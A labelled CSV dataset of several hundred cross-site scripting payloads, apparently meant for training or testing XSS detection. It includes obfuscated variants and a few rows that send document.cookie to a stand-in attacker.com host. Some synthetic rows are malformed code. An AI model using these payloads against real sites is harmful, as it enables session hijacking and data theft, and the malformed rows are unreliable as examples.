payload,context,technique,severity,length,source
"<header onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</header>",tag_injection,none,medium,71,real
\' oninput=alert(1)//,attribute_escape,synthetic,medium,21,synthetic
'><script>console.log(location.hash)</script>,script_injection,synthetic,medium,45,synthetic
"data:text/html,<script>confirm(%27XSS%27)</script>",js_uri,synthetic,medium,50,synthetic
"\"" onpagehide=\u0061lert(document.domain)//",attribute_escape,synthetic,low,43,synthetic
"<style onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</style>",tag_injection,none,medium,67,real
"element.setAttribute(""onclick"",""\u0061lert(btoa(document.cookie))"")",dom_sink,synthetic,high,67,synthetic
document.write(%22<img src=x onerror=prompt(1)>%22),dom_sink,synthetic,medium,51,synthetic
%3Cscript ondblclick=prompt(1)/%3E,tag_injection,synthetic,medium,34,synthetic
%27><img src=x onpromptaction=prompt(1)>,attribute_escape,synthetic,medium,40,synthetic
' onpopstate=alert(1) ',attribute_escape,synthetic,medium,23,synthetic
"<style oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</style>",tag_injection,none,medium,62,real
%22><img src=x oncut=confirm(1)>,attribute_escape,synthetic,medium,32,synthetic
"<samp draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",tag_injection,none,medium,86,real
%3Csvg%20onload%3D%60alert%28%2FAnonKryptiQuz%2F%29%60%3E%3C%2Fsvg%3E,generic,url_encoding,low,69,real
 on&#97;uxclick=confirm(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,49,synthetic
<s onpointerover=alert(1) style=display:block>AnonKryptiQuz</s>,tag_injection,none,medium,63,real
<svg><datalist onload=alert(1)></datalist>,tag_injection,none,medium,42,real
"%22 ><svg onpaste=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,57,synthetic
`><img src=x oncontextmenu=alert(1)>,attribute_escape,synthetic,medium,36,synthetic
<scRipT>wIndOw['coNsoLe.Log'](1)</scRipT>,script_injection,synthetic,low,41,synthetic
%27 onfullscreenchange=console.log(1) %27,attribute_escape,synthetic,medium,41,synthetic
"\"" onwebkittransitionend=confirm(location.hash)//",attribute_escape,synthetic,medium,49,synthetic
""" ><svG oNtrAnsItiOnrUn=ConSolE.lOg('XSS')>",attribute_escape,synthetic,medium,43,synthetic
<form	onp&#97;g&#101;hid&#101;=confirm(1)>,tag_injection,synthetic,medium,42,synthetic
"<IMG SRC=x onloadedmetadata=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,67,real
"""><&#97;r&#101;&#97; onclos&#101;=prompt(1)>",tag_injection,synthetic,medium,44,synthetic
'><img src=x onb&#101;for&#101;cut=consol&#101;.log(1)>,attribute_escape,synthetic,low,55,synthetic
%3Ctable/onsearch=prompt(1)%3E,tag_injection,synthetic,medium,30,synthetic
<!--><form onw&#101;bkittr&#97;nsition&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,77,synthetic
{{$on.constructor('&#97;l&#101;rt(docum&#101;nt.dom&#97;in)')()}},template_injection,synthetic,low,65,synthetic
" onWebKitTraNsiTioNenD=aLerT(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,59,synthetic
' ><svg onmousewheel=prompt('XSS')>,attribute_escape,synthetic,medium,35,synthetic
	onMouSeeNteR=pRomPt(DocUmeNt.DomAin),event_handler,synthetic,medium,37,synthetic
onkeydown=alert&#40;'XSS'&#41;,event_handler,synthetic,low,30,synthetic
%3Cscript%3Econfirm(location.hash)%3C/script%3E,script_injection,synthetic,medium,47,synthetic
OncLicK=pRomPt('XSS'),event_handler,synthetic,medium,21,synthetic
""" %3E%3Csvg ongestureend=alert(1)%3E",attribute_escape,synthetic,medium,36,synthetic
"'><script>confirm(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,high,57,synthetic
"<thead ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,91,real
"<main ondblclick=""alert(1)"">AnonKryptiQuz</main>",tag_injection,none,medium,48,real
<html onpointermove=alert(1) style=display:block>AnonKryptiQuz</html>,tag_injection,none,medium,69,real
"<xmp onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",tag_injection,none,medium,68,real
"<div draggable=""true"" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable style=display:block>drop here</picture>",tag_injection,none,medium,131,real
"<map onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</map>",tag_injection,none,medium,65,real
"~2; ""%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E""",dom_sink,url_encoding,high,62,real
<script>prompt`%27XSS%27`</script>,script_injection,synthetic,low,34,synthetic
"window[""f&#101;tch""]('XSS')",dom_sink,synthetic,low,27,synthetic
"<section draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</section>",tag_injection,none,medium,87,real
'><img src=x onauxclick=\u0061lert(1)>,attribute_escape,synthetic,low,38,synthetic
onclos&#101;=consol&#101;.log&#40;'XSS'&#41;,event_handler,synthetic,low,44,synthetic
""" onfocus=confirm('XSS') &#97;utofocus=""",attribute_escape,synthetic,medium,40,synthetic
"\"" onh&#97;shch&#97;ng&#101;=prompt('XSS')//",attribute_escape,synthetic,medium,44,synthetic
"<style>:target {color: red;}</style><isindex id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></isindex>",tag_injection,none,medium,117,real
"<ifRamE oNgeStuReeNd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection,synthetic,high,65,synthetic
%3Cimage/onend=prompt(1)%3E,tag_injection,synthetic,medium,27,synthetic
'><img src=x onplaying=\u0061lert(location.hash)>,attribute_escape,synthetic,low,49,synthetic
 onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(1),event_handler,synthetic,low,50,synthetic
<table onpointerleave=alert(1) style=display:block>AnonKryptiQuz</table>,tag_injection,none,medium,72,real
"""><Img srC=x onBluR=aLerT(dOcuMenT.dOmaIn)>",attribute_escape,synthetic,medium,43,synthetic
"""><img src=x onblur=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,58,synthetic
"<small onmouseleave=""alert(1)"">AnonKryptiQuz</small>",tag_injection,none,medium,52,real
"__pRotO__[""oNweBkiTtrAnsItiOneNd""]=XMLHTtpReqUesT(STriNg.FroMChArCOde(88,83,83))",dom_sink,synthetic,high,80,synthetic
OnmOusEenTer=prOmpT&#40;DocUmeNt.DomAin&#41;,event_handler,synthetic,low,44,synthetic
<th onpointerout=alert(1) style=display:block>AnonKryptiQuz</th>,tag_injection,none,medium,64,real
%3Cbutton x=y ondragenter=alert(location.hash)%3E,tag_injection,synthetic,medium,49,synthetic
""" oNtoUchMovE=aLerT(lOcaTioN.hAsh) """,attribute_escape,synthetic,medium,36,synthetic
`><img src=x onpoint&#101;rmov&#101;=prompt('XSS')>,attribute_escape,synthetic,medium,51,synthetic
'><img src=x onpopstate=confirm(document.domain)>,attribute_escape,synthetic,medium,49,synthetic
&gt;+src+onerror=confirm&amp;lpar;1&amp;rpar;&lt;,event_handler,none,low,49,real
"<figcaption onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",tag_injection,none,medium,79,real
' ><svg onpointerdown=console.log(document.domain)>,attribute_escape,synthetic,medium,51,synthetic
onpopst&#97;t&#101;=confirm(1),event_handler,synthetic,medium,30,synthetic
"<b&#97;s&#101; ontouchmov&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) ontouchmov&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,163,synthetic
`><Img srC=x onBefOreInpUt=ConSolE.lOg('XSS')>,attribute_escape,synthetic,medium,46,synthetic
<button onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"<figure oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99,real
"LocAtiOn.HreF=""JavAscRipT:pRomPt(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)""",dom_sink,synthetic,high,72,synthetic
onclick=confirm(1),event_handler,synthetic,medium,18,synthetic
"<track onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</track>",tag_injection,none,medium,83,real
"window[""confirm""](loc&#97;tion.h&#97;sh)",dom_sink,synthetic,low,40,synthetic
<!--><marquee onkeydown=confirm(1)>,tag_injection,synthetic,medium,35,synthetic
"<title onmousemove=""alert(1)"">AnonKryptiQuz</title>",tag_injection,none,medium,51,real
<button popovertarget=x>Click me</button><head onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</head>,tag_injection,none,medium,104,real
"x""><svg%250donload%3D""window%5B%27alert%27%5D(location[%27hostname%27])""",attribute_escape,url_encoding,low,72,real
document.write(%22<img src=x onerror=alert(document.cookie)>%22),dom_sink,synthetic,high,64,synthetic
%27><img src=x onmousewheel=alert(document.domain)>,attribute_escape,synthetic,medium,51,synthetic
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onanimationstart=""alert(1)""></tfoot>",tag_injection,none,medium,97,real
"%3Csource
oninput=alert(location.hash)%3E",tag_injection,synthetic,medium,41,synthetic
OnpRomPtaCtiOn=ConFirM(1),event_handler,synthetic,medium,25,synthetic
<maRquEe	OnpOpsTatE=aLerT('XSS')>,tag_injection,synthetic,medium,33,synthetic
""";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("";XSS"";)>;",attribute_escape,none,medium,60,real
"&#101;v&#97;l(""consol&#101;.log(docum&#101;nt.dom&#97;in)"")",dom_sink,synthetic,low,59,synthetic
<table oncopy=confirm('XSS') oncopy=confirm('XSS')>,tag_injection,synthetic,medium,51,synthetic
"""><img src=x onerror=javascript:alert((""A""))>",js_uri,none,medium,45,real
document.write(%22<img src=x onerror=alert(document.cookie+%27&loc=%27+location.href)>%22),dom_sink,synthetic,high,90,synthetic
"<div draggable=""true"" contenteditable>drag me</div><span ondrop=alert(1) contenteditable>drop here</span>",tag_injection,none,medium,105,real
"j&#97;v&#97;script:&#97;l&#101;rt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri,synthetic,low,78,synthetic
"%27><img src=x onscrollend=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,64,synthetic
<img onkeypress=console.log(1) onkeypress=console.log(1)>,tag_injection,synthetic,medium,57,synthetic
"%22><img src=x oncut=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,59,synthetic
javascript:%0a\u0061lert(document.domain),js_uri,synthetic,low,41,synthetic
"<acronym onmouseout=""alert(1)"">AnonKryptiQuz</acronym>",tag_injection,none,medium,54,real
"<style>:target {transform: rotate(180deg);}</style><applet id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></applet>",tag_injection,none,medium,130,real
"__proto__[""onvolumechange""]=alert(location.hash)",dom_sink,synthetic,medium,48,synthetic
"Obj&#101;ct.&#97;ssign(window,{""ondr&#97;g&#101;nt&#101;r"":f&#101;tch})",dom_sink,synthetic,low,71,synthetic
"<set draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</set>",tag_injection,none,medium,84,real
<u onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,63,real
"(new Function(""alert(String.fromCharCode(88,83,83))""))();",dom_sink,synthetic,high,57,synthetic
""" onbeforecut=alert(document.domain) """,attribute_escape,synthetic,medium,38,synthetic
"%3C!--%3E%3Cxmp ontouchend=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,72,synthetic
<td onstalled=confirm('XSS')>,tag_injection,synthetic,medium,29,synthetic
"<button onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</button>",tag_injection,none,medium,73,real
`><Img srC=x onResEt=AleRt('XSS')>,attribute_escape,synthetic,medium,34,synthetic
"<legend oncut=""alert(1)"" contenteditable>AnonKryptiQuz</legend>",tag_injection,none,medium,63,real
'><img src=x onbeforecut=console.log(1)>,attribute_escape,synthetic,medium,40,synthetic
"<style>@keyframes slidein {}</style><keygen style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></keygen>",tag_injection,none,medium,172,real
location.href=%22javascript:confirm(%27//attacker.com/?c=%27+document.cookie)%22,dom_sink,synthetic,high,80,synthetic
"<mark id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></mark>",tag_injection,none,medium,84,real
"""`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>",script_injection,none,medium,52,real
<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>,tag_injection,none,medium,68,real
"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable style=display:block>drop here</blockquote>",tag_injection,none,medium,141,real
document.write(%22<img src=x onerror=prompt(%27//attacker.com/?c=%27+document.cookie)>%22),dom_sink,synthetic,high,90,synthetic
"""><details/open/ontoggle=confirm(""/xss_by_Y000!/"")>",tag_injection,none,medium,51,real
<nav contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,57,real
onmozfullscreenchange=javascript:prompt('XSS'),event_handler,synthetic,medium,46,synthetic
"<rt onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</rt>",tag_injection,none,medium,61,real
javascript:new%20Function`al\ert\`1\``;,js_uri,url_encoding,low,39,real
%3Cplaintext src=x onrepeat=prompt('XSS')%3E,tag_injection,synthetic,medium,44,synthetic
<svg onload=prompt%26%23x000000028;document.domain)>,dom_sink,url_encoding,low,52,real
"SetTimEouT(""FetCh(BtoA(dOcuMenT.cOokIe))"",0)",dom_sink,synthetic,high,44,synthetic
"%27 ><svg onpointermove=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""confirm(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))"")",dom_sink,synthetic,medium,125,synthetic
j&#97;vascript:\u0061lert(1),js_uri,synthetic,low,28,synthetic
&#0060,generic,html_entity,low,6,real
"%22 ontransitionrun=alert(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,60,synthetic
<&#101;mb&#101;d/onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,101,synthetic
<code onpointermove=alert(1) style=display:block>AnonKryptiQuz</code>,tag_injection,none,medium,69,real
"java
script:confirm(location.hash)",js_uri,synthetic,medium,34,synthetic
<embed src=javascript:alert(1)>,js_uri,none,medium,31,real
""" oNcuT=cOnfIrm('XSS') """,attribute_escape,synthetic,medium,24,synthetic
"<script SRC=""http://www.securitycompass.com/xss.jpg""></script>",script_injection,none,low,62,real
<sp&#97;n x=y ons&#101;curitypolicyviol&#97;tion=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,87,synthetic
\' onpagehide=alert(location.hash)//,attribute_escape,synthetic,medium,36,synthetic
<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>,tag_injection,none,medium,74,real
\%27 onfocusout=confirm(location.hash)//,attribute_escape,synthetic,medium,40,synthetic
' ><svg ondragenter=confirm('XSS')>,attribute_escape,synthetic,medium,35,synthetic
"<xsS
oNenD=pRomPt('XSS')>",tag_injection,synthetic,medium,25,synthetic
"%27 onanimationcancel=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,high,68,synthetic
#{{prompt(%27XSS%27)}},template_injection,synthetic,medium,22,synthetic
OnpOinTerMovE=cOnfIrm('XSS'),event_handler,synthetic,medium,28,synthetic
"javascr	ipt:%0aconsole.log(String.fromCharCode(88,83,83))",js_uri,synthetic,high,57,synthetic
<noframes onpointerdown=alert(1) style=display:block>AnonKryptiQuz</noframes>,tag_injection,none,medium,77,real
"<b draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</b>",tag_injection,none,medium,75,real
"<template ondblclick=""alert(1)"">AnonKryptiQuz</template>",tag_injection,none,medium,56,real
<xsS oNtoGglE=cOnsOle.loG('XSS')>,tag_injection,synthetic,medium,33,synthetic
<script	onpointerrawupdate=console.log(document.domain)>,tag_injection,synthetic,medium,56,synthetic
&quot; onpointercancel=prompt(1) x=&quot;,attribute_escape,synthetic,medium,41,synthetic
<image2 onpointerenter=alert(1) style=display:block>AnonKryptiQuz</image2>,tag_injection,none,medium,74,real
"(neW FUncTioN(""FetCh(DocUmeNt.CooKie)""))();",dom_sink,synthetic,high,43,synthetic
"SetIntErvAl(""alErt(btOa(DocUmeNt.CooKie))"",100)",dom_sink,synthetic,high,47,synthetic
"<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>",dom_sink,none,low,168,real
"__pRotO__[""oNmoUseEntEr""]=fEtcH('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)",dom_sink,synthetic,high,69,synthetic
\%27 onpointerrawupdate=prompt(%27XSS%27)//,attribute_escape,synthetic,medium,43,synthetic
<t&#101;mpl&#97;t&#101; oncont&#101;xtm&#101;nu=consol&#101;.log(1)/>,tag_injection,synthetic,low,69,synthetic
"<img LOWSRC=""javascript:document.vulnerable=true;"">",dom_sink,none,low,51,real
"<tfoot onmouseup=""alert(1)"">AnonKryptiQuz</tfoot>",tag_injection,none,medium,49,real
<body onfocusin=alert(1)>,tag_injection,none,medium,25,real
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->,dom_sink,comment_injection|case_variation,low,72,real
j&#97;v&#97;	script:consol&#101;.log(1),js_uri,synthetic,low,39,synthetic
\' OnfOcuS=aLerT(1)//,attribute_escape,synthetic,medium,21,synthetic
"<ruby oncut=""alert(1)"" contenteditable>AnonKryptiQuz</ruby>",tag_injection,none,medium,59,real
'><Img srC=x onGesTurEenD=cOnfIrm(loCatIon.haSh)>,attribute_escape,synthetic,medium,49,synthetic
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",script_injection,none,medium,63,real
"__pRotO__[""oNweBkiTtrAnsItiOneNd""]=aLerT(1)",dom_sink,synthetic,medium,43,synthetic
"<rp onmouseover=""alert(1)"">AnonKryptiQuz</rp>",tag_injection,none,medium,45,real
 oninput=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,46,synthetic
`%3E%3Cimg src=x ontransitionend=alert(1)%3E,attribute_escape,synthetic,medium,44,synthetic
"<template draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</template>",tag_injection,none,medium,74,real
""" oNtrAnsItiOneNd=ProMpt(loCatIon.haSh) """,attribute_escape,synthetic,medium,41,synthetic
'><img src=x onr&#101;s&#101;t=&#97;l&#101;rt('XSS')>,attribute_escape,synthetic,low,53,synthetic
' ><svg onp&#97;g&#101;r&#101;v&#101;&#97;l=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,low,82,synthetic
<x/onclick=globalThis&lsqb;’\u0070r\u006f’+’mpt’]&lt;)>clickme,tag_injection,unicode_escape,low,62,real
"&#00;</form><input type&#61;""date"" onfocus=""alert(6317)"">",tag_injection,html_entity,medium,57,real
document.querySelector(%22body%22).innerHTML+=%22eval(%27//attacker.com/?c=%27+document.cookie)%22,dom_sink,synthetic,high,98,synthetic
\' onkeypress=alert('XSS')//,attribute_escape,synthetic,medium,28,synthetic
"%27 ><svg onend=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,55,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=""position:absolute;"" onanimationcancel=""print()""></sub>",tag_injection,none,low,175,real
"<boDy OngEstUreStaRt=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) onGesTurEstArt=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,122,synthetic
"%0d%0a%20""><img src=q onerror=alert(1)>",tag_injection,url_encoding,medium,39,real
" onmozfullscreenchange=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,60,synthetic
	on&#97;nim&#97;tion&#101;nd=prompt(1),event_handler,synthetic,medium,38,synthetic
<arEa OnlOad=coNsoLe.Log(doCumEnt.doMaiN) OnlOad=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,78,synthetic
document.querySelector(%22body%22).innerHTML+=%22XMLHttpRequest(document.cookie+%27&loc=%27+location.href)%22,dom_sink,synthetic,high,109,synthetic
"EleMenT.sEtATtrIbuTe(""onCliCk"",""aLerT(lOcaTioN.hAsh)"")",dom_sink,synthetic,medium,54,synthetic
&quOt; onPlaYinG=aLerT(lOcaTioN.hAsh) x=&qUot;,attribute_escape,synthetic,medium,46,synthetic
"<hr onclick=""alert(1)"">AnonKryptiQuz</hr>",tag_injection,none,medium,41,real
"<t&#97;bl&#101;
ons&#101;l&#101;ct=prompt(1)>",tag_injection,synthetic,medium,45,synthetic
%22><img src=x ondragenter=prompt(document.domain)>,attribute_escape,synthetic,medium,51,synthetic
%3Cmeta x=y onpointerover=confirm(1)%3E,tag_injection,synthetic,medium,39,synthetic
""" onfocus=&#97;l&#101;rt('XSS') &#97;utofocus=""",attribute_escape,synthetic,low,47,synthetic
document.write(%22<img src=x onerror=console.log(document.domain)>%22),dom_sink,synthetic,medium,70,synthetic
' %3E%3Csvg onblur=alert(document.domain)%3E,attribute_escape,synthetic,medium,44,synthetic
<s&#101;l&#101;ct on&#97;nim&#97;tionst&#97;rt=prompt('XSS') on&#97;nim&#97;tionst&#97;rt=prompt('XSS')>,tag_injection,synthetic,medium,104,synthetic
\' ontoggle=\u0061lert(document.domain)//,attribute_escape,synthetic,low,41,synthetic
__proto__[%22oncontextmenu%22]=confirm(%27XSS%27),dom_sink,synthetic,medium,49,synthetic
<di&#97;log/onpl&#97;y=prompt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,56,synthetic
"__proto__[""ong&#101;stur&#101;st&#97;rt""]=f&#101;tch(docum&#101;nt.dom&#97;in)",dom_sink,synthetic,low,78,synthetic
"__pRotO__[""oNpaGesWap""]=ProMpt('XSS')",dom_sink,synthetic,medium,37,synthetic
'><img src=x onclose=\u0061lert(document.domain)>,attribute_escape,synthetic,low,49,synthetic
"<dialog draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",tag_injection,none,medium,85,real
"""><t&#101;mpl&#97;t&#101; on&#101;nd&#101;d=prompt('XSS')>",tag_injection,synthetic,medium,58,synthetic
"""><img src=x onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,81,synthetic
`><Img srC=x onCloSe=ConSolE.lOg(LocAtiOn.HasH)>,attribute_escape,synthetic,medium,48,synthetic
%22 onpause=confirm(document.domain) %22,attribute_escape,synthetic,medium,40,synthetic
"\"" OnaNimAtiOniTerAtiOn=ProMpt(1)//",attribute_escape,synthetic,medium,35,synthetic
"document.querySelector(""body"").innerHTML+=""console.log(location.hash)""",dom_sink,synthetic,high,70,synthetic
onpaste=javascr	ipt:confirm(document.domain),event_handler,synthetic,medium,44,synthetic
"""><&#97;nim&#97;t&#101;motion ong&#101;stur&#101;st&#97;rt=confirm(1)>",tag_injection,synthetic,medium,70,synthetic
<obJecT oNsuBmiT=cOnfIrm(loCatIon.haSh)/>,tag_injection,synthetic,medium,41,synthetic
<&#97; ons&#101;&#97;rch=&#97;l&#101;rt(1)/>,tag_injection,synthetic,low,44,synthetic
"<div draggable=""true"" contenteditable>drag me</div><content ondrop=alert(1) contenteditable style=display:block>drop here</content>",tag_injection,none,medium,131,real
""" oNplAy=ConFirM(dOcuMenT.dOmaIn) """,attribute_escape,synthetic,medium,35,synthetic
"eval(""XMLHttpRequest(document.domain)"")",dom_sink,synthetic,high,39,synthetic
"<div draggable=""true"" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>",tag_injection,none,medium,103,real
<m&#97;th	onpl&#97;ying=consol&#101;.log('XSS')>,tag_injection,synthetic,low,48,synthetic
" oncut=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,44,synthetic
onfocusin=confirm/*x*/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,48,synthetic
"%3Cscript%3E/x/console.log(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,high,70,synthetic
<taBle onTouCheNd=ProMpt(doCumEnt.doMaiN)/>,tag_injection,synthetic,medium,43,synthetic
""" oNpoIntEruP=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape,synthetic,high,54,synthetic
`><Img srC=x onMouSeeNteR=aLerT(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,49,synthetic
"""%3E%3Cimg onpageswap=console.log(1)%3E",tag_injection,synthetic,medium,39,synthetic
`><img src=x onmouseup=prompt(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
"<b oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</b>",tag_injection,none,medium,54,real
"""><Img srC=x onTraNsiTioNruN=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,72,synthetic
' onpaste=console.log(1) ',attribute_escape,synthetic,medium,26,synthetic
"s&#101;tInt&#101;rv&#97;l(""&#97;l&#101;rt(bto&#97;(docum&#101;nt.cooki&#101;))"",100)",dom_sink,synthetic,low,84,synthetic
"<img src=x\x12onerror=""javascript:alert(4337)"">",js_uri,none,medium,47,real
"<style>:target {transform: rotate(180deg);}</style><a id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></a>",tag_injection,none,medium,120,real
"\""><iframe/src=javascript:alert%26%23x000000028%3b)>",js_uri,url_encoding,low,52,real
%3Cscript ondblclick=prompt(1)%3E,tag_injection,synthetic,medium,33,synthetic
onscrollend=prompt(1),event_handler,synthetic,medium,21,synthetic
"ongotpointercapture=\u0061lert/*x*/(String.fromCharCode(88,83,83))",event_handler,synthetic,high,66,synthetic
' oNtoGglE=pRomPt(1) ',attribute_escape,synthetic,medium,22,synthetic
&quOt; onProMptActIon=prOmpT(1) x=&qUot;,attribute_escape,synthetic,medium,40,synthetic
<button popovertarget=x>Click me</button><address onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</address>,tag_injection,none,medium,110,real
<ol id=x tabindex=1 ondeactivate=alert(1)></ol><input id=y autofocus>,tag_injection,none,medium,69,real
<mark onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"""%3E%3Cimg src=x onselect=console.log(location.hash)%3E",attribute_escape,synthetic,medium,55,synthetic
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",js_uri,none,medium,65,real
""" oNcoPy=ProMpt(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,34,synthetic
""" %3E%3Csvg onpagereveal=console.log(1)%3E",attribute_escape,synthetic,medium,42,synthetic
"<command onmouseleave=""alert(1)"">AnonKryptiQuz</command>",tag_injection,none,medium,56,real
<svg onload%09%20%28%2c%3b=alert(1)>,generic,url_encoding,medium,36,real
<audio onplay=console.log(1)/>,tag_injection,synthetic,medium,30,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onfocusout"":&#97;l&#101;rt})",dom_sink,synthetic,low,60,synthetic
<sp&#97;n onb&#101;for&#101;toggl&#101;=prompt(loc&#97;tion.h&#97;sh) onb&#101;for&#101;toggl&#101;=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,130,synthetic
